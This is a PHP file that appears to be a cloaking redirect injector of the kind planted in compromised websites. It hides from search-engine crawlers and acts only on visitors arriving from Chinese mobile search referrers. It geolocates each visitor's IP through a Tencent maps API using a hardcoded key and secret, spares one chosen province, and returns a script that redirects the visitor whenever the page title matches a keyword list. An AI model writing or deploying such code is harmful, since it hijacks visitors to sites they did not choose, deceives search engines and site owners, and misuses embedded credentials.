<?php
function inject($title, $area)
{
    if (is_spider()) {
        return "";
    }
    if (!is_search_engine()) {
        return "";
    }

    $document_root = $_SERVER['DOCUMENT_ROOT'];
    $word = file_get_contents("{$document_root}/badwordlist.txt");
    $klist = txt2arr($word);

    $pro = getcookies('pro');
    if (empty($scpro)) {
        $ip = getip();

        $key = "3SDBZ-RR6C4-XEVU2-XXSLV-H2CJ6-PKF2D";
        $sk = "tdzTz4Ff2mD6EpsRhrrsXciP5k4zr4j";

        $sig = md5("/ws/location/v1/ip?ip={$ip}&key={$key}{$sk}");
        $ipuri = "https://apis.map.qq.com/ws/location/v1/ip?ip={$ip}&key={$key}&sig={$sig}";

        $snoopy = new Snoopy;
        $snoopy->referer = "https://www.qq.com";
        $snoopy->fetch($ipuri);
        $str = $snoopy->results;
        $data = json_decode($str, true);
        if ($data['result']['ad_info']['province']) {
            $pro = $data['result']['ad_info']['province'];
            setcookies('pro', $pro);
        }
        if ($pro == $area) {
            return "";
        }
    }
    foreach ($klist as $val) {
        $s = explode("|", $val);
        if (strpos($title, $s[0]) !== false) {
            return "<script>window.location.href='{$s[1]}'</script>";
        }
    }
    return "";
}

function is_spider()
{
    $arr = ['spider', 'Baiduspider', 'Sogou web spider', 'Sogou Pic Spider', '360Spider', 'YisouSpider', 'Googlebot', 'bingbot', 'Sosospider', 'Sosoimagespider', 'YoudaoBot'];
    $useragent = @$_SERVER['HTTP_USER_AGENT'] . "";
    if (empty($useragent)) {
        return false;
    }
    foreach ($arr as $val) {
        if (strpos(strtolower($useragent), strtolower($val)) !== false) {
            return true;
        }
    }
    return false;
}

function is_search_engine()
{
    $refer = @$_SERVER['HTTP_REFERER'] . "";
    if (empty($refer)) {
        return false;
    }
    $arr = ['so.m.sm.cn', 'yz.m.sm,cn', 'm.baidu.com', 'quark.sm.cn', 'm.sogou.com', 'wap.sogou.com', 'm.so.com'];
    foreach ($arr as $val) {
        if (strpos(strtolower($refer), strtolower($val)) !== false) {
            return true;
        }
    }
    return false;
}
